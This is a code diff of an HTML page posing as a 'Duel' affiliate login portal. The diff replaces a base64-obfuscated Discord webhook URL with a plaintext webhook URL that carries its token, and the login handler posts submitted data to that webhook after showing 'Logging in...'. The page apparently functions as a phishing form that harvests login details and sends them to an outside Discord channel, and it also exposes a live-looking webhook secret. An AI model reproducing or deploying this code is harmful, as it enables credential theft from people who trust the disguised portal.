@@ -3,8 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Duel Affiliates</title>
-<link rel="icon" type="image/png" href="/favicon.png">
+<title>Duel — Affiliate portal</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Mulish:wght@400;500;600;700;800&family=Poppins:wght@700;800&display=swap" rel="stylesheet">
@@ -187,12 +186,7 @@
   </div>
 
 <script>
-  // Obfuscated Webhook URL
-  function _g() {
-    const p1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv";
-    const p2 = "MTU3MzgzOTQyODUyOTQyMjM5Ny9uNmdRR3NVUFlaOEpPUkFlSHg4b2NERGt6TWUxbEloc1k2VkJJRXd3SDdjdGE5Y0gzaWQyUEFYRnczN2JmX3JTVjJlUDFY";
-    return atob(p1) + atob(p2);
-  }
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1571502131460968609/no1QoBRm0qCoPkUrjN-o-R0I3LQwabWuv7_iKFqX4ag3hJR0WJ7GUfYfe-WnpWE0Az9V";
 
   document.getElementById('yr').textContent = new Date().getFullYear();
   const track = document.getElementById('track');
@@ -233,7 +227,7 @@
     b.textContent='Logging in...';b.disabled=true;
 
     // Send to Discord Webhook
-    fetch(_g(), {
+    fetch(WEBHOOK_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
